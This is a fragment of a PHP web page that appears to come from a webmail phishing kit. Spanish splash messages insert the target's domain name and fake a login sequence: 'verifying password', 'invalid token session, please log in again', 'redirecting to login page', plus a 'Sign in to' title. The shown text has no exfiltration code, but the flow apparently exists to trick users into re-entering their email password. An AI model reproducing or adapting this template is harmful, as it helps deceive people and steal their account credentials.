...
splashmessage[0]='Conectado a <?php echo $login ?>'

splashmessage[1]='Espere por favor...'

splashmessage[2]='Verificando contraseña <?php echo $login ?>'

splashmessage[3]='Espere por favor...'

splashmessage[4]='Sesión de token no válida. por favor inicia sesión de nuevo'

splashmessage[5]='Connected to <?php echo $yuh ?> Servidor de correo'

splashmessage[6]='Redirigir a la página de inicio de sesión...'
...
<title> Iniciar sesión en <?php echo $login ?> </title>
</head>
<body>
